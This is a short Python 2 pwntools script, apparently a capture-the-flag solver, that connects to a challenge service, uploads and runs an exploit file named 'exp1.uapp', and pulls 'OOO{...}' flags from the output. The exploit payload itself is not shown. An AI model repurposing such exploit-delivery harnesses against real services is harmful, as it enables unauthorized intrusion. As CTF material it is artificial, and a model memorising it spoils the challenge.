#!/usr/local/bin/python
from pwn import *
import hashlib, sys

r = remote(sys.argv[1], int(sys.argv[2]))

def download(app):
    with open(app) as f:
        blob = f.read()
        r.sendline('download %s %d' % (app, len(blob)))
        r.send(blob)

r.sendline('run flag1.papp')
download('exp1.uapp')
r.sendline('run exp1.uapp')
print r.recvuntil('BEGIN\n')
d = r.recvuntil('END\n', drop=True)
r.sendline('exit')
flags = re.findall(r'OOO{.*}', d) # it appears multiple times
print flags
if len(flags) > 0:
    print 'FLAG:', flags[0]
sys.exit(0)
